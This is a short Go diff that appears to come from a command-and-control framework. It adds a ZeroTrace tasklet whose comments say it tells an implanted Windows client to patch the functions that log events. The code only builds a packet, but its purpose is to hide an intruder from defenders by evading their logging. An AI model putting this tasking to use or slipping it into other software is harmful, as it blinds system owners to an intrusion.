@@ -4,6 +4,24 @@ package task
 
 import "github.com/iDigitalFlame/xmt/com"
 
+// ZeroTrace will create a Tasklet that will instruct the client to attempt to
+// patch the function calls for logging events on Windows systems.
+//
+// This willreturn an error if it fails.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices.
+//
+// C2 Details:
+//  ID: TvZeroTrace
+//
+//  Input:
+//      <none>
+//  Output:
+//      <none>
+func ZeroTrace() *com.Packet {
+	return &com.Packet{ID: TvZeroTrace}
+}
+
 // CheckDLL is a similar function to ReloadDLL.
 // This function will return 'true' if the contents in memory match the
 // contents of the file on disk. Otherwise it returns false.
